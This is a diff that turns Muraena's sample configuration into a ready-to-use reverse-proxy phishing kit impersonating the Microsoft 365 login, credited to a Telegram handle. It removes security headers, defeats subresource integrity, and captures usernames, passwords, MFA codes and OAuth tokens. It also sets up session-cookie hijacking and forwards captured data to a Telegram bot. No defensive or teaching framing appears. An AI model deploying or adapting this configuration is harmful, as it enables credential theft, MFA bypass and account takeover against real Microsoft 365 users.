@@ -1,255 +1,204 @@
-#
-# Proxy
-# The proxy configuration controls how Muraena handles traffic routing between the phishing target and the
-# legitimate destination.
-# See: https://muraena.phishing.click/docs/proxy
-#
+#############################################################################
+# MURAENA — O365 COMBINED CONFIG by t.me/officialmonsterz
+# Merged: token-capture skeleton + full watchdog/redirect/decoy hardening
+# Placeholders to replace: YOUR-PHISHING-DOMAIN.COM, YOUR-TG-BOT-TOKEN, YOUR-TG-CHAT-ID
+#############################################################################
+
 [proxy]
-    # Phishing domain
-    phishing = "phishing.click"
+    phishing = "YOUR-PHISHING-DOMAIN.COM"
+    destination = "login.microsoftonline.com"
+    IP = "0.0.0.0"
+    port = 443
+    listener = "tcp4"
 
-    # Target domain to proxy
-    destination = "example.com"
-
-    # Listening IP address (IPv4 or IPv6)
-	# e.g. 0.0.0.0 or [::]
-    # Default 0.0.0.0
-    #IP = "127.0.0.1"
-
-    # Listeninng TCP Port
-    # Default 443 for HTTPS, 80 for HTTP
-    #port = 443
-
-	# Listen announces on the local network address.
-	# The network must be "tcp", "tcp4", "tcp6" (default "tcp").
-	# listener = "tcp4"
-
-    #
-    # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
-    # - test.muraena:8443
-    # - victim.site: 443
-    #
-    # port mapping can be configured as follows:
-    # <ListeningPort>:<TargetPort>
-    #portmapping = "443:31337"
-
-    # Force HTTP to HTTPS redirection
     [proxy.HTTPtoHTTPS]
     enable = true
     HTTPport = 80
 
+[origins]
+    externalOriginPrefix = "cdn-"
+    externalOrigins = [
+        "login.live.com",
+        "login.microsoft.com",
+        "login.microsoftonline.com",
+        "device.login.microsoftonline.com",
+        "account.microsoft.com",
+        "outlook.office.com",
+        "outlook.office365.com",
+        "office.com",
+        "www.office.com",
+        "aadcdn.msftauth.net",
+        "aadcdn.msauth.net",
+        "accdn.msftauth.net",
+        "amcdn.msftauth.net",
+        "secure.aadcdn.microsoftonline-p.com",
+        "enterpriseregistration.windows.net",
+        "res.cdn.office.net",
+        "shell.cdn.office.net",
+        "ow2.res.office365.com",
+        "nec.video.communication.microsoft.com"
+    ]
 
-#
-# Origins
-# See: https://muraena.phishing.click/docs/origins
-#
-#[origins]
-# externalOriginPrefix = "cdn-"
-# externalOrigins = [ ]
-
-
-#
-# Transform
-# Proxy's replacement rules
-# See: https://muraena.phishing.click/docs/transform
-#
 [transform]
-    # Enable transformation rules in base64 strings
     [transform.base64]
-        enable = false
-        padding = [ "=", "." ]
+    enable = false
+    padding = ["=", "."]
 
     [transform.request]
-#        userAgent = "MuraenaProxy"
-#        headers = ["Cookie", "Referer", "Origin", "X-Forwarded-For"]
-#        remove.headers = [
-#            "X-FORWARDED-FOR",
-#            "X-FORWARDED-PROTO",
-#        ]
-#        add.headers = [
-#            {name = "X-Phishing", value = "via Muraena"},
-#        ]
+    headers = ["Cookie", "Referer", "Origin"]
+    remove.headers = [
+        "X-Forwarded-For",
+        "X-Real-IP",
+        "X-Original-URL",
+        "X-Original-Host"
+    ]
 
     [transform.response]
-        skipContentType = [ "font/*", "image/*" ]
+    skipContentType = ["font/*", "image/*"]
+    headers = [
+        "Location",
+        "Set-Cookie",
+        "Origin",
+        "WWW-Authenticate",
+        "Access-Control-Allow-Origin"
+    ]
+    remove.headers = [
+        "X-Frame-Options",
+        "Content-Security-Policy",
+        "Content-Security-Policy-Report-Only",
+        "Report-To",
+        "X-XSS-Protection",
+        "X-Content-Type-Options"
+    ]
+    customContent = [
+        ["integrity=", "integrify="]
+    ]
 
-#        headers = [
-#            "Location",
-#            "WWW-Authenticate",
-#            "Origin",
-#            "Set-Cookie",
-#            "Access-Control-Allow-Origin",
-#        ]
-#        customContent = [
-#            ["this is green","this is blue"],
-#        ]
-#
-#        remove.headers = [
-#            "X-XSS-Protection",
-#        ]
-#        add.headers = [
-#            {name = "X-Phishing", value = "via Muraena"},
-#        ]
+[[redirect]]
+    hostname = "YOUR-PHISHING-DOMAIN.COM"
+    path = "/common/oauth2/v2.0/authorize"
+    redirectTo = "https://YOUR-PHISHING-DOMAIN.COM/mail"
+    httpStatusCode = 302
 
+[[redirect]]
+    hostname = "YOUR-PHISHING-DOMAIN.COM"
+    path = "/owa/"
+    redirectTo = "https://YOUR-PHISHING-DOMAIN.COM/mail"
+    httpStatusCode = 302
 
-#
-# Redirect
-# See: https://muraena.phishing.click/docs/redirect
-#
-#[redirect]
-#    [[redirect]]
-#        hostname = "phishing.click"
-#        path = "/login"
-#        query = "id=123"
-#        redirectTo = "https://poor.victim/login"
-#        httpStatusCode = 301
-
-
-#
-# LOG
-# See: https://muraena.phishing.click/docs/log
-#
 [log]
-    enable =true
-    # Default: "muraena.log"
-#    filePath = "muraena.log"
+    enable = true
+    filePath = "muraena.log"
 
-
-#
-# Redis
-# See: https://muraena.phishing.click/docs/redis
-#
-#[redis]
-#	host = "" # default: "127.0.0."
-#	port =  # default: 6379
-#	password = "" # default: ""
-
-#
-# TLS
-# See: https://muraena.phishing.click/docs/tls
-#
 [tls]
-    enable =true
-
-    # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
-    # filepath
+    enable = true
     expand = false
-    certificate = "./config/cert.pem"
-    key = "./config/privkey.pem"
-    root = "./config/fullchain.pem"
+    certificate = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/fullchain.pem"
+    key = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/privkey.pem"
+    root = "/etc/letsencrypt/live/YOUR-PHISHING-DOMAIN.COM/chain.pem"
     sslKeyLog = "./config/sslkeylog.log"
+    minVersion = "TLS1.2"
+    renegotiationSupport = "Never"
 
-	#
-	# Danger zone, be careful editing these settings
-	#
-	# Minimum supported TLS version: SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3
-	minVersion = "TLS1.2"
-#    maxVersion = "TLS1.3"
-#	preferServerCipherSuites = true
-#	sessionTicketsDisabled =  true
-	# InsecureSkipVerify controls whether muraena verifies the server's
-	# certificate chain and host name.
-#	insecureSkipVerify = false
-
-	# RenegotiationSupport
-	# Note: renegotiation is not defined in TLS 1.3.
-	# Options:
-	# - Never (default):disables renegotiation
-	# - Once:			allows a remote server to request renegotiation once per connection.
-	# - Freely:			allows a remote server to repeatedly request renegotiation.
-	renegotiationSupport = "Never"
-
-
-
-#############################################################################
-# Modules
-#############################################################################
-
-#
-# Tracking
-# See: https://muraena.phishing.click/modules/tracker
-#
 [tracking]
-    enable =false
+    enable = true
     trackRequestCookie = true
 
     [tracking.trace]
-        # Tracking identifier
-        identifier = "_gat"
-        # Rule to generate and validate a tracking identifier
-        validator = "[a-zA-Z0-9]{5}"
-        # Tracking initial HTTP Header (empty is: If-Range)
-        header = "X-Whatveryouwant-Header"
-        # Set tracking cookie for a custom domain
-        # domain = ""
+        identifier = "_clsk"
+        validator = "[a-zA-Z0-9]{22}"
+        header = "X-Ms-Client-DNS"
 
         [tracking.trace.landing]
-            # Tracking types can be Path || Query (default)
-            #
-            # query:
-            #  ?identifier=trackingID
-            #
-            # path:
-            #   /trackingID
-            #
-            type = "query"
-            # Landing HTTP Header (empty is: X-If-Landing-Redirect)
-            header = "X-Whatveryouwant-Landing-Header"
-
-            # redirect url once the landing is detected (applicable only if type is path)
-            # redirectTo = "https://www.google.com"
+        type = "query"
+        header = "X-Ms-Client-Region"
 
 [tracking.secrets]
-        paths = ["/login", "/submit"]
+    paths = [
+        "/common/login",
+        "/common/GetCredentialType",
+        "/common/SAS/ProcessAuth",
+        "/common/SAS/Validate",
+        "/common/SAS/BeginAuth",
+        "/common/oauth2/authorize",
+        "/common/GetSessionState",
+        "/users/authenticated",
+        "/oauth2/v2.0/token",
+        "/common/federated"
+    ]
 
-        [[tracking.secrets.patterns]]
-        label = "Credential Capture - Username"
-        start = "username="
-        end = "&"
+    [[tracking.secrets.patterns]]
+    label = "O365 Username"
+    start = "loginfmt="
+    end = "&"
 
+    [[tracking.secrets.patterns]]
+    label = "O365 Username (legacy)"
+    start = "login="
+    end = "&"
 
+    [[tracking.secrets.patterns]]
+    label = "O365 Password"
+    start = "passwd="
+    end = "&"
 
-#
-# NecroBrowser
-# See: https://muraena.phishing.click/modules/necrobrowser
-#
-#[necrobrowser]
-#    enable = true
-#    endpoint = "http://10.0.0.2:3000/instrument"
-#    profile = "./config/instrument.necro"
+    [[tracking.secrets.patterns]]
+    label = "O365 TOTP / MFA Code"
+    start = "otc="
+    end = "&"
 
-#    [necrobrowser.urls]
-#    authSession = ["/settings/profile"]
-#    authSessionResponse = ["/privacypolicy"]
-#
-#    [necrobrowser.trigger]
-#    type = "cookie"
-#    values = ["ESAUTHENTICATED"]
-#    delay = 5
+    [[tracking.secrets.patterns]]
+    label = "OAuth Authorization Code"
+    start = "code="
+    end = "&"
 
+    [[tracking.secrets.patterns]]
+    label = "OAuth Access Token"
+    start = "access_token="
+    end = "&"
 
-#
-# Static Server
-# See: https://muraena.phishing.click/modules/staticserver
-#
-#[staticServer]
-#    enable =false
-#    localPath = "./static/"
-#    urlPath = "/evilpath/"
+    [[tracking.secrets.patterns]]
+    label = "OAuth Refresh Token"
+    start = "refresh_token="
+    end = "&"
 
-#
-# Watchdog
-# See: https://muraena.phishing.click/modules/watchdog
-#[watchdog]
-#	enable =true
-#	dynamic = true
-#	rules = "./config/watchdog.rules"
-#	geoDB = "./config/geoDB.mmdb"
+    [[tracking.secrets.patterns]]
+    label = "OAuth ID Token"
+    start = "id_token="
+    end = "&"
 
-#
-# Telegram
-# See: https://muraena.phishing.click/modules/telegram
-#[telegram]
-#    enable =true
-#    botToken = "1587304999:AAG4cH8VzJ1b8tbamq0VZM9C01KkDjY5IFo"
-#    chatIDs = ["-1001856562703"]
+    [[tracking.secrets.patterns]]
+    label = "OAuth Session State"
+    start = "session_state="
+    end = "&"
+
+[necrobrowser]
+    enable = false
+    endpoint = "http://10.0.0.2:3000/instrument"
+    profile = "./config/instrument.necro"
+
+    [necrobrowser.urls]
+    authSession = ["/mail/inbox"]
+    authSessionResponse = ["/owa/"]
+
+    [necrobrowser.trigger]
+    type = "cookie"
+    values = ["ESTSAUTHPERSISTENT", "ESTSAUTH"]
+    delay = 5
+
+[staticServer]
+    enable = true
+    localPath = "./static/"
+    urlPath = "/robots.txt/"
+
+[watchdog]
+    enable = true
+    dynamic = true
+    rules = "./config/watchdog.rules"
+    geoDB = "./config/geoDB.mmdb"
+
+[telegram]
+    enable = true
+    botToken = "YOUR-TG-BOT-TOKEN"
+    chatIDs = ["YOUR-TG-CHAT-ID"]
+	
